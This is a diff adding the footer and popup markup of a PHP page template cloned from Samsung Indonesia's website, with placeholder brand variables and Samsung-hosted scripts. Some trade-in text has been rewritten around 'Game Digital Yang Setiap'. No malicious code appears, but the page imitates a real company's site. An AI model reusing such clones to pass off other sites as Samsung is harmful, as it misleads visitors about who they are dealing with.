+      <!-- ===== BOTTOM BAR ===== -->
+      <div class="footer-bottom">
+        <div class="footer-copyright-wrap">
+          <div class="footer-copyright-align">
+            <p class="footer-copyright">
+              &copy; 2026 <?= $BRAND; ?> x <?= $BRAND2; ?>. All rights reserved.
+            </p>
+          </div>
+          <div class="footer-language">
+            <a class="footer-language__anchor" href="<?= $canonical; ?>">
+              Indonesia / Bahasa Indonesia
+            </a>
+          </div>
+        </div>
+
+        <div an-ac="scroll:100" an-ca="scroll" an-la="scroll:100" an-tr="nv02_footer bottom--text-scroll" class="footer-language-wrap">
+          <div class="footer-language">
+            <a class="footer-language__anchor" href="<?= $canonical; ?>">
+              Indonesia / Bahasa Indonesia
+            </a>
+          </div>
+
+          <div class="footer-terms">
+            <ul class="footer-terms__list" role="list">
+              <li class="footer-terms__item" role="listitem">
+                <a class="footer-terms__link" href="/kebijakan-privasi">
+                  Privasi
+                </a>
+              </li>
+              <li class="footer-terms__item" role="listitem">
+                <a class="footer-terms__link" href="/legal">
+                  Legal
+                </a>
+              </li>
+              <li class="footer-terms__item" role="listitem">
+                <a class="footer-terms__link" href="/sitemap">
+                  Peta Situs
+                </a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="footer-sns">
+            <span class="footer-sns__title">
+              Ingin Tetap Terhubung?
+            </span>
+            <ul class="footer-sns__list" role="list">
+              <li class="footer-sns__item" role="listitem">
+                <a class="footer-sns__link" href="https://facebook.com/<?= $BRAND; ?> x <?= $BRAND2; ?>" rel="noreferrer noopener" target="_blank" aria-label="Facebook : Buka di Tab Baru">
+                  <svg class="icon" focusable="false">
+                    <use href="#facebook-bold" xlink:href="#facebook-bold"></use>
+                  </svg>
+                </a>
+              </li>
+              <li class="footer-sns__item" role="listitem">
+                <a class="footer-sns__link" href="https://twitter.com/<?= $BRAND; ?> x <?= $BRAND2; ?>" rel="noreferrer noopener" target="_blank" aria-label="Twitter : Buka di Tab Baru">
+                  <svg class="icon" focusable="false">
+                    <use href="#twitter-bold" xlink:href="#twitter-bold"></use>
+                  </svg>
+                </a>
+              </li>
+              <li class="footer-sns__item" role="listitem">
+                <a class="footer-sns__link" href="https://instagram.com/<?= $BRAND; ?> x <?= $BRAND2; ?>" rel="noreferrer noopener" target="_blank" aria-label="Instagram : Buka di Tab Baru">
+                  <svg class="icon" focusable="false">
+                    <use href="#instagram-bold" xlink:href="#instagram-bold"></use>
+                  </svg>
+                </a>
+              </li>
+              <li class="footer-sns__item" role="listitem">
+                <a class="footer-sns__link" href="https://youtube.com/@<?= $BRAND; ?> x <?= $BRAND2; ?>" rel="noreferrer noopener" target="_blank" aria-label="Youtube : Buka di Tab Baru">
+                  <svg class="icon" focusable="false">
+                    <use href="#youtube-bold" xlink:href="#youtube-bold"></use>
+                  </svg>
+                </a>
+              </li>
+            </ul>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </footer>
+
+   <button an-ac="back to top" an-ca="indication" an-la="back to top" an-tr="nv02_footer bottom--text-back to top" class="fab" title="Go to Top">
+    Go to Top
+    <svg class="fab__icon" focusable="false">
+     <use href="#up-highest-bold" xlink:href="#up-highest-bold">
+     </use>
+    </svg>
+   </button>
+   <!--googleon: all-->
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-dependencies.min.407b108c60433f00a6b1a0e8f272a2c1.js"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-base-ux25.min.91a4ebeb2dec9b19aa121b5c7154ff51.js"></script>
+   <!-- <sly data-sly-test="false">
+		<script type="text/javascript" src='/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-site/resources/au/js/au.js'></script>
+	</sly> -->
+   <!--[if lt IE 9]>
+	<script src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/ie9/html5.js"></script>
+	<![endif]-->
+   <!--[if lte IE 9]>
+	<script type='text/javascript' src='//cdnjs.cloudflare.com/ajax/libs/jquery-ajaxtransport-xdomainrequest/1.0.3/jquery.xdomainrequest.min.js'></script>
+	<![endif]-->
+   <script type="text/javascript">
+    /* recaptcha script for Samsung 2020.07.10 */
+		
+		var conRecaptcha;
+		var recaptchaCallback = function() {	
+			 if($("#Con_reCaptcha").length > 0){
+					conRecaptcha = grecaptcha.render('Con_reCaptcha', {
+				    	'sitekey' : '6Lc-358UAAAAAFmYE7zKV3PU0m9crt6-tj-UJsll'
+				    });
+			 }
+		};
+   </script>
+   <script defer="" src="https://www.google.com/recaptcha/api.js?onload=recaptchaCallback&amp;render=explicit" type="text/javascript"></script>
+   <section aria-modal="true" class="trade-in-learn-more-popup" role="dialog">
+    <div class="trade-in-learn-more-popup__dimmed">
+    </div>
+    <div class="trade-in-learn-more-popup__contents">
+     <div class="scrollbar">
+      <div class="trade-in-learn-more-popup__inner-wrap scrollbar__contents">
+       <p class="trade-in-learn-more-popup__title">
+        Cara kerja tukar tambah
+       </p>
+       <div class="trade-in-learn-more-popup__list-wrap">
+        <ul class="trade-in-learn-more-popup__list">
+         <li class="trade-in-learn-more-popup__list-item">
+          <em class="trade-in-learn-more-popup__list-item-num">
+           01
+          </em>
+          <div class="trade-in-learn-more-popup__list-item-text-wrap">
+           <span class="trade-in-learn-more-popup__list-item-text-desc">
+            Choose your new Game Digital Yang Setiap device and tell us about your old one.
+            <br/>
+            Jika memenuhi syarat, Anda akan melihat taksiran nilai tukar tambah.
+           </span>
+          </div>
+         </li>
+         <li class="trade-in-learn-more-popup__list-item">
+          <em class="trade-in-learn-more-popup__list-item-num">
+           02
+          </em>
+          <div class="trade-in-learn-more-popup__list-item-text-wrap">
+           <span class="trade-in-learn-more-popup__list-item-text-desc">
+            Get an upfront discount on the price of your new Game Digital Yang Setiap device.
+           </span>
+          </div>
+         </li>
+         <li class="trade-in-learn-more-popup__list-item">
+          <em class="trade-in-learn-more-popup__list-item-num">
+           03
+          </em>
+          <div class="trade-in-learn-more-popup__list-item-text-wrap">
+           <span class="trade-in-learn-more-popup__list-item-text-desc">
+            Kirimkan perangkat lama Anda untuk menyelesaikan tukar tambah.
+           </span>
+          </div>
+         </li>
+        </ul>
+        <!--
+			<sly data-sly-test="false">
+              <div class="trade-in-learn-more-popup__cta-wrap">
+                <a class="cta cta--underline cta--black cta--icon" href="https://www.samsung.com/pt/campanha-retomas/" title="Open in a New Window" target="_blank"> More Information 
+                  <svg class="icon" focusable="false">
+					<use xlink:href="#outlink-bold" href="#outlink-bold"></use>
+                  </svg>
+                </a>
+              </div>
+            </sly>
+            -->
+       </div>
+      </div>
+     </div>
+     <button class="trade-in-learn-more-popup__close">
+      <span class="hidden">
+       TUTUP
+      </span>
+      <svg class="icon" focusable="false">
+       <use href="#delete-bold" xlink:href="#delete-bold">
+       </use>
+      </svg>
+     </button>
+    </div>
+   </section>
+   <input id="tariffAdditionalPromotionCarrierUrl" type="hidden"/>
+   <div class="component-area" style="">
+    <section aria-modal="true" class="tariff-popup" role="dialog">
+     <div class="tariff-popup__dimmed">
+     </div>
+     <div class="tariff-popup__contents">
+      <div class="tariff-popup__contents-plan" style="display:block;">
+       <div class="tariff-popup__inner-wrap scrollbar">
+        <div class="tariff-popup__inner scrollbar__contents">
+         <div class="tariff-popup__header">
+          <div class="tariff-popup__headline">
+           All from one hand
+          </div>
+          <p class="tariff-popup__desc">
+           Now you get innovative smartphone with right tariff plan.
+          </p>
+         </div>
+         <div class="tariff-popup__choose" role="tablist" style="display:none;">
+          <div class="tariff-popup__choose-item" role="presentation">
+           <a aria-selected="false" class="tariff-popup__choose-item-btn" href="javascript:;" id="choose-tab-1" role="tab">
+            New Contracts
+           </a>
+          </div>
+          <div class="tariff-popup__choose-item" role="presentation">
+           <div class="tariff-popup__choose-tooltip">
+            <div class="tariff-popup__choose-tooltip__btn-wrap">
+             <button aria-expanded="false" class="tariff-popup__choose-tooltip__btn" type="button">
+              <svg class="icon help" focusable="false">
+               <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#help-regular">
+               </use>
+              </svg>
+              <svg class="icon cancel" focusable="false">
+               <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#cancel-bold">
+               </use>
+              </svg>
+              <span class="hidden">
+               see what this
+              </span>
+             </button>
+             <span class="tariff-popup__choose-tooltip__arrow">
+             </span>
+            </div>
+            <div class="tariff-popup__choose-tooltip__box" role="tooltip">
+             <span class="tariff-popup__choose-tooltip__box-arrow">
+             </span>
+             <p class="tariff-popup__choose-tooltip__box-desc">
+              Stay with your network operator.
+             </p>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div aria-hidden="true" aria-labelledby="choose-tab-1" class="tariff-popup__choose-panel" id="choose-content-1" role="tabpanel">
+          <div class="tariff-popup__tab-wrap">
+           <div class="tariff-popup__tab-list-wrap">
+            <button class="tariff-popup__tab-list-prev" role="button" style="display:none;">
+             prev
+             <svg class="icon" focusable="false">
+              <use href="#previous-bold" xlink:href="#previous-bold">
+              </use>
+             </svg>
+            </button>
+            <div class="tariff-popup__tab-list-area">
+             <!--/* UK, SE 경우 Tab Divider 를 숨기기 위해 .hide-divider 추가 /*-->
+             <div class="tariff-popup__tab-list" role="tablist">
+              <div class="tariff-popup__tab-item-wrap" role="presentation">
+               <a class="tariff-popup__tab-item" href="javascript:void(0);">
+               </a>
+              </div>
+             </div>
+            </div>
+            <button class="tariff-popup__tab-list-next" role="button">
+             Next
+             <svg class="icon" focusable="false">
+              <use href="#next-bold" xlink:href="#next-bold">
+              </use>
+             </svg>
+            </button>
+            <div class="tariff-popup__tab-list-gl-left">
+            </div>
+            <div class="tariff-popup__tab-list-gl-right">
+            </div>
+           </div>
+           <div class="tariff-popup__tab-panel-wrap">
+            <div class="tariff-popup__tab-panel">
+            </div>
+           </div>
+          </div>
+         </div>
+         <div aria-hidden="true" aria-labelledby="choose-tab-2" class="tariff-popup__choose-panel" id="choose-content-2" role="tabpanel">
+          <div class="tariff-popup__tab-wrap">
+           <div class="tariff-popup__tab-list-wrap">
+            <button class="tariff-popup__tab-list-prev" role="button" style="display:none;">
+             prev
+             <svg class="icon" focusable="false">
+              <use href="#previous-bold" xlink:href="#previous-bold">
+              </use>
+             </svg>
+            </button>
+            <div class="tariff-popup__tab-list-area">
+             <!--/* UK, SE 경우 Tab Divider 를 숨기기 위해 .hide-divider 추가 /*-->
+             <div class="tariff-popup__tab-list" role="tablist">
+             </div>
+            </div>
+            <button class="tariff-popup__tab-list-next" role="button">
+             Next
+             <svg class="icon" focusable="false">
+              <use href="#next-bold" xlink:href="#next-bold">
+              </use>
+             </svg>
+            </button>
+            <div class="tariff-popup__tab-list-gl-left">
+            </div>
+            <div class="tariff-popup__tab-list-gl-right">
+            </div>
+           </div>
+           <div class="tariff-popup__tab-panel-wrap">
+            <div class="tariff-popup__tab-panel">
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="tariff-popup__btn-wrap">
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step2:back" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-prev cta cta--outlined cta--black" style="display:none;">
+         BATALKAN
+        </button>
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step1:close" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-close cta cta--outlined cta--black">
+         BATALKAN
+        </button>
+        <!-- CTA 활성화 시 disabled 제거, .cta--disabled 제거 -->
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step1:continue" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-next cta cta--contained cta--emphasis cta--disabled" disabled="">
+         LANJUTKAN
+        </button>
+       </div>
+      </div>
+      <div class="tariff-popup__contents-plan-details" style="display:none;">
+       <div class="tariff-popup__inner-wrap scrollbar">
+        <div class="tariff-popup__inner scrollbar__contents">
+         <div class="tariff-popup__header">
+          <div class="tariff-popup__headline">
+           The Network Plan Details
+          </div>
+          <p class="tariff-popup__desc">
+          </p>
+         </div>
+         <div class="tariff-popup__plan-details-wrap">
+          <section class="tariff-popup__plan-details expand">
+           <a class="tariff-popup__plan-details-title" href="javascript:;" role="button">
+            <span class="tariff-popup__plan-details-title-text">
+             Plan Benefits
+            </span>
+            <span>
+             <svg class="icon collapse">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#open-down-bold">
+              </use>
+             </svg>
+             <span class="hidden collapse">
+              Klik untuk Memperluas
+             </span>
+             <svg class="icon expand">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#close-up-bold">
+              </use>
+             </svg>
+             <span class="hidden expand">
+              Klik untuk Tutup
+             </span>
+            </span>
+           </a>
+           <div class="tariff-popup__plan-details-desc plan-benefits-desc">
+           </div>
+          </section>
+          <section class="tariff-popup__plan-details">
+           <a class="tariff-popup__plan-details-title" href="javascript:;" role="button">
+            <span class="tariff-popup__plan-details-title-text">
+             Out of Bundle Charges
+            </span>
+            <span>
+             <svg class="icon collapse">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#open-down-bold">
+              </use>
+             </svg>
+             <span class="hidden collapse">
+              Klik untuk Memperluas
+             </span>
+             <svg class="icon expand">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#close-up-bold">
+              </use>
+             </svg>
+             <span class="hidden expand">
+              Klik untuk Tutup
+             </span>
+            </span>
+           </a>
+           <div class="tariff-popup__plan-details-desc out-of-bundle-charges-desc">
+           </div>
+          </section>
+          <section class="tariff-popup__plan-details">
+           <a class="tariff-popup__plan-details-title" href="javascript:;" role="button">
+            <span class="tariff-popup__plan-details-title-text">
+             Terms &amp; Conditions
+            </span>
+            <span>
+             <svg class="icon collapse">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#open-down-bold">
+              </use>
+             </svg>
+             <span class="hidden collapse">
+              Klik untuk Memperluas
+             </span>
+             <svg class="icon expand">
+              <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#close-up-bold">
+              </use>
+             </svg>
+             <span class="hidden expand">
+              Klik untuk Tutup
+             </span>
+            </span>
+           </a>
+           <div class="tariff-popup__plan-details-desc term-conditions-desc">
+           </div>
+          </section>
+         </div>
+        </div>
+       </div>
+       <div class="tariff-popup__btn-wrap">
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step1:back" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-back cta cta--outlined cta--black">
+         Kembali
+        </button>
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step1:close" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-close cta cta--contained cta--emphasis">
+         Tutup
+        </button>
+       </div>
+      </div>
+      <div class="tariff-popup__contents-plan-selected" style="display:none;">
+       <div class="tariff-popup__inner-wrap scrollbar">
+        <div class="tariff-popup__inner scrollbar__contents">
+         <div class="tariff-popup__header">
+          <div class="tariff-popup__headline">
+           All from one hand
+           <span class="tariff-popup__icon">
+            <div class="image">
+             <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/tariff-popup-icon.png" role="img"/>
+            </div>
+           </span>
+          </div>
+          <p class="tariff-popup__desc">
+           Now you get innovative smartphone with right tariff plan.
+          </p>
+         </div>
+         <div class="tariff-popup__selected-wrap">
+          <div class="tariff-popup__selected">
+           <div class="tariff-popup__selected-spec">
+            <div class="tariff-popup__selected-spec-header">
+             <div class="tariff-popup__selected-spec-img">
+              <img alt="" src="#"/>
+             </div>
+             <div class="tariff-popup__selected-spec-detail">
+              <strong class="tariff-popup__selected-spec-name">
+              </strong>
+              <span class="tariff-popup__selected-spec-value">
+              </span>
+             </div>
+            </div>
+            <div class="tariff-popup__selected-spec-desc">
+             <ul class="tariff-popup__selected-spec-list">
+             </ul>
+            </div>
+            <div class="tariff-popup__selected-add-opt">
+            </div>
+           </div>
+           <div class="tariff-popup__selected-total">
+            <div class="tariff-popup__selected-total-title">
+             Upfront Cost
+            </div>
+            <div class="tariff-popup__selected-total-price">
+            </div>
+            <p class="tariff-popup__selected-total-desc">
+             Der Anschlusspreis und monatlicher Tarifpreis werden vom jeweiligen Netzanbieter eingezogen. Du zahlst jetzt nur den einmaligen Ger&auml;tepreis.
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="tariff-popup__checkbox-wrap">
+         </div>
+         <div class="tariff-popup__table-wrap">
+          <div class="tariff-popup__table-inner">
+          </div>
+          <div class="tariff-popup__table-disclaimer">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="tariff-popup__btn-wrap">
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step2:back" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-prev cta cta--outlined cta--black">
+         BACK
+        </button>
+        <!-- CTA 활성화 시 disabled 제거, .cta--disabled 제거 -->
+        <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step2:confirm" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__btn-submit cta cta--contained cta--emphasis cta--disabled" disabled="">
+         Terapkan
+        </button>
+       </div>
+      </div>
+      <div class="tariff-popup__contents-form" style="display:none;">
+       <div class="tariff-popup__inner-wrap scrollbar">
+        <div class="tariff-popup__inner scrollbar__contents">
+         <div class="tariff-popup__header">
+          <div class="tariff-popup__headline">
+           Check the availabbility
+          </div>
+         </div>
+         <div class="tariff-popup__step">
+          <div class="tariff-popup__step-inner">
+           <span class="tariff-popup__step-fill is-active">
+           </span>
+           <span class="tariff-popup__step-fill">
+           </span>
+           <span class="tariff-popup__step-fill">
+           </span>
+          </div>
+         </div>
+         <div class="tariff-popup__step-progress">
+          <span class="hidden">
+           1 of 3
+          </span>
+         </div>
+         <div class="tariff-popup__validation-message">
+          <strong class="tariff-popup__validation-message-title">
+           Wrong address
+          </strong>
+          <div class="tariff-popup__validation-message-content">
+           <p>
+            Unfortunately, we cannot make you a DSL offer for the address you have checked.The address you have given is not unique, please choose from the address suggestions.
+           </p>
+          </div>
+         </div>
+         <div class="tariff-popup__form-wrap">
+          <div class="tariff-popup__form-list">
+           <div class="tariff-popup__form-item tariff-popup__form-item-wide" style="display:none;">
+            <div class="menu menu--text-field" data-comp-name="menu" data-max-item-number="5" data-type="textField">
+             <select aria-labelledby="tariff-addr-label-id" class="menu__select" tabindex="-1">
+             </select>
+             <p class="menu--text-field__hint" id="tariff-addr-label-id">
+              Empfohlene Adresse
+             </p>
+             <button aria-expanded="false" aria-haspopup="listbox" aria-labelledby="tariff-addr-label-id tariff-text-label-id" class="menu__select-field" type="button">
+              <span class="menu__select-field-text" id="tariff-text-label-id">
+              </span>
+              <svg aria-hidden="true" class="menu__select-field-icon down" focusable="false">
+               <use href="#open-down-bold" xlink:href="#open-down-bold">
+               </use>
+              </svg>
+              <svg aria-hidden="true" class="menu__select-field-icon up" focusable="false">
+               <use href="#close-up-bold" xlink:href="#close-up-bold">
+               </use>
+              </svg>
+             </button>
+            </div>
+           </div>
+           <div class="tariff-popup__form-item tariff-popup__form-item-wide">
+            <div class="text-field-v2" data-comp-name="textFieldv2">
+             <label class="text-field-v2__hint" for="text-field-tariff-postcode">
+              Postcode
+             </label>
+             <div class="text-field-v2__input-wrap">
+              <input autocomplete="off" class="text-field-v2__input" id="text-field-tariff-postcode" maxlength="5" name="postCode" type="text"/>
+              <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+               <svg aria-hidden="true" class="icon delete" focusable="false">
+                <use href="#cancel-bold" xlink:href="#cancel-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+             <p aria-hidden="true" class="text-field-v2__text assistive">
+              Please provide a valid postcode
+             </p>
+             <p aria-hidden="true" class="text-field-v2__text error">
+              Please enter correct information again.
+             </p>
+            </div>
+           </div>
+           <div class="tariff-popup__form-item">
+            <div class="text-field-v2" data-comp-name="textFieldv2">
+             <label class="text-field-v2__hint" for="text-field-tariff-street">
+              Street
+             </label>
+             <div class="text-field-v2__input-wrap">
+              <input autocomplete="off" class="text-field-v2__input" id="text-field-tariff-street" name="streetName" type="text"/>
+              <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+               <svg aria-hidden="true" class="icon delete" focusable="false">
+                <use href="#cancel-bold" xlink:href="#cancel-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+             <p aria-hidden="true" class="text-field-v2__text assistive">
+              Please provide a valid street
+             </p>
+             <p aria-hidden="true" class="text-field-v2__text error">
+              Please enter correct information again.
+             </p>
+            </div>
+           </div>
+           <div class="tariff-popup__form-item">
+            <div class="text-field-v2" data-comp-name="textFieldv2">
+             <label class="text-field-v2__hint" for="text-field-3">
+              House number
+             </label>
+             <div class="text-field-v2__input-wrap">
+              <input autocomplete="off" class="text-field-v2__input" id="text-field-3" name="houseNumber" type="text"/>
+              <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+               <svg aria-hidden="true" class="icon delete" focusable="false">
+                <use href="#cancel-bold" xlink:href="#cancel-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+             <p aria-hidden="true" class="text-field-v2__text assistive">
+              Please provide a valid house number
+             </p>
+             <p aria-hidden="true" class="text-field-v2__text error">
+              Please enter correct information again.
+             </p>
+            </div>
+           </div>
+           <div class="tariff-popup__form-item">
+            <div class="text-field-v2" data-comp-name="textFieldv2">
+             <label class="text-field-v2__hint" for="text-field-4">
+              Additional house information
+             </label>
+             <div class="text-field-v2__input-wrap">
+              <input autocomplete="off" class="text-field-v2__input" id="text-field-4" name="houseNumberAddition" type="text"/>
+              <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+               <svg aria-hidden="true" class="icon delete" focusable="false">
+                <use href="#cancel-bold" xlink:href="#cancel-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+             <p aria-hidden="true" class="text-field-v2__text assistive">
+              Additional information placeholder
+             </p>
+             <p aria-hidden="true" class="text-field-v2__text error">
+              Please enter correct information again.
+             </p>
+            </div>
+           </div>
+           <div class="tariff-popup__form-item">
+            <div class="text-field-v2" data-comp-name="textFieldv2">
+             <label class="text-field-v2__hint" for="text-field-5">
+              City
+             </label>
+             <div class="text-field-v2__input-wrap">
+              <input autocomplete="off" class="text-field-v2__input" id="text-field-5" name="locality" type="text"/>
+              <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+               <svg aria-hidden="true" class="icon delete" focusable="false">
+                <use href="#cancel-bold" xlink:href="#cancel-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+             <p aria-hidden="true" class="text-field-v2__text assistive">
+              Please provide a valid city
+             </p>
+             <p aria-hidden="true" class="text-field-v2__text error">
+              Please enter correct information again.
+             </p>
+            </div>
+           </div>
+          </div>
+         </div>
+         <p class="tariff-popup__form-txt">
+          *Required fields
+         </p>
+         <div class="tariff-popup__disclaimer-wrap">
+          <div class="tariff-popup__disclaimer">
+           Anda dapat menemukan informasi tentang pengolahan data pribadi melalui link
+           <a href="https://www.samsung.com/id/info/privacy/" target="_blank" title="Open in a new window">
+            Kebijakan privasi
+           </a>
+           .
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="tariff-popup__btn-wrap">
+        <button class="tariff-popup__btn-close cta cta--outlined cta--black">
+         Batalkan
+        </button>
+        <!-- CTA 활성화 시 disabled 제거, .cta--disabled 제거 -->
+        <button class="tariff-popup__btn-next cta cta--contained cta--emphasis cta--disabled" disabled="">
+         Lanjutkan
+        </button>
+       </div>
+      </div>
+      <button an-ac="pd buying tool" an-ca="option click" an-la="tariff:step1:close" an-tr="header(pim)_service option selector tariff-product detail-text-button" class="tariff-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+      </button>
+     </div>
+    </section>
+   </div>
+   <div class="tariff-info-popup">
+    <div class="layer-popup" id="tariff-info-popup" role="dialog" style="display:block">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <div class="layer-popup__title">
+         Pay monthly phone contracts
+        </div>
+        <p class="layer-popup__desc">
+         Buy your phone along with an inclusive monthly network plan and pay monthly*
+        </p>
+        <div class="tariff-info-popup__wrap">
+         <div class="tariff-info-popup__inner">
+          <div class="tariff-info-popup__more">
+           <ul class="tariff-info-popup__more-list">
+            <li>
+             <strong class="tariff-info-popup__more-title">
+              Choose your network
+             </strong>
+             <p class="tariff-info-popup__more-text">
+              Choose from a range of networks and inclusive monthly plans to get started with your new Galaxy phone straight away.
+             </p>
+            </li>
+            <li>
+             <strong class="tariff-info-popup__more-title">
+              Bayar Bulanan
+             </strong>
+             <p class="tariff-info-popup__more-text">
+              Pay for your phone and an inclusive bundle of calls, texts and data in one easy-to-manage monthly fee.
+             </p>
+            </li>
+            <li>
+             <strong class="tariff-info-popup__more-title">
+              Next steps
+             </strong>
+             <p class="tariff-info-popup__more-text">
+              You will be redirected to our trusted partner, A1 Comms Ltd (trading as Mobileshop), to purchase your phone and setup your monthly plan.
+             </p>
+            </li>
+           </ul>
+          </div>
+          <div class="tariff-info-popup__info">
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="tariff-info-popup__cta">
+       <!--/* P6의 cta 적용 방식에 따라 마크업 변경 */ -->
+       <a class="cta cta--contained cta--emphasis" href="javascript:void(0);" title="Link Title">
+        Choose your plan
+       </a>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Layer Popup Close
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <input id="cfTradeInConditionCheckYn" type="hidden"/>
+   <input id="cfTradeInCategoryUseYn" type="hidden"/>
+   <section aria-modal="true" class="trade-in-popup" id="hubble-tradein-layer" role="dialog">
+    <div class="trade-in-popup__dimmed">
+    </div>
+    <div class="trade-in-popup__contents">
+     <!-- new-hybris -->
+     <div class="trade-in-popup__zipcode-wrap" role="dialog">
+      <div class="scrollbar">
+       <div class="trade-in-popup__inner-wrap scrollbar__contents">
+        <p class="trade-in-popup__title">
+         Cek layanan tukar tambah di area Anda!
+        </p>
+        <div class="trade-in-popup__imei">
+         <div class="trade-in-popup__imei-desc-wrap">
+          <p class="trade-in-popup__imei-desc">
+           Akses menu Tukar Tambah di aplikasi Samsung Gift Indonesia atau unduh aplikasi SS.com Trade In untuk memeriksakan ponsel pintar Anda. Setelah ponsel Anda lolos uji, IMEI perangkat lama Anda akan tercatat dalam basis data kami, sehingga Anda dapat menikmati diskon tukar tambah khusus.
+          </p>
+          <p class="trade-in-popup__imei-desc">
+           <a href="https://www.samsung.com/id/offer/mobile-trade-in/" target="_blank" title="Buka di Tab Baru">
+            SAMSUNG TRADE IN
+           </a>
+          </p>
+         </div>
+         <div class="trade-in-popup__imei-form-wrap">
+          <strong class="trade-in-popup__imei-form-title">
+           Masukkan kode pos Anda
+          </strong>
+          <div class="trade-in-popup__imei-form">
+           <div class="text-field-v2 no-title">
+            <label class="text-field-v2__hint" for="zipcode-input">
+             Kode Pos (5 angka)
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="off" class="text-field-v2__input" id="zipcode-input" maxlength="5" type="text" value=""/>
+             <button class="text-field-v2__input-icon delete" title="Delete">
+              <svg class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+            </div>
+            <p class="text-field-v2__text error">
+            </p>
+            <p class="text-field-v2__text success">
+             Tukar tambah tersedia di area&nbsp;kode pos Anda
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="trade-in-popup__dropdown-wrap">
+         <div class="trade-in-popup__brand-dropdown-wrap">
+          <p class="trade-in-popup__dropdown-title">
+           Estimasi harga tertinggi perangkat lama Anda
+          </p>
+          <div class="trade-in-popup__dropdown">
+           <button class="trade-in-popup__dropdown--select-field">
+            <span class="trade-in-popup__dropdown--select-field-name">
+             Select Brand
+            </span>
+           </button>
+           <div class="trade-in-popup__dropdown--select-list scrollbar">
+            <ul class="scrollbar__contents">
+            </ul>
+           </div>
+          </div>
+         </div>
+         <div class="trade-in-popup__model-dropdown-wrap">
+          <p class="trade-in-popup__dropdown-title">
+           Estimasi harga tertinggi perangkat lama Anda
+          </p>
+          <div class="trade-in-popup__dropdown">
+           <button class="trade-in-popup__dropdown--select-field">
+            <span class="trade-in-popup__dropdown--select-field-name">
+             Select Model
+            </span>
+            <span class="trade-in-popup__dropdown--select-field-price">
+            </span>
+           </button>
+           <div class="trade-in-popup__dropdown--select-list scrollbar">
+            <ul class="scrollbar__contents">
+             <li class="trade-in-popup__dropdown--search-wrap">
+              <label class="trade-in-popup__dropdown--search-label" for="trade-in-popup__dropdown--search-model">
+               Search...
+              </label>
+              <input autocomplete="off" class="trade-in-popup__dropdown--search-input" id="trade-in-popup__dropdown--search-model" type="text"/>
+              <button class="trade-in-popup__dropdown--search-btn" type="submit">
+               <span class="hidden">
+                select device model search
+               </span>
+              </button>
+             </li>
+            </ul>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="trade-in-popup__btn-wrap">
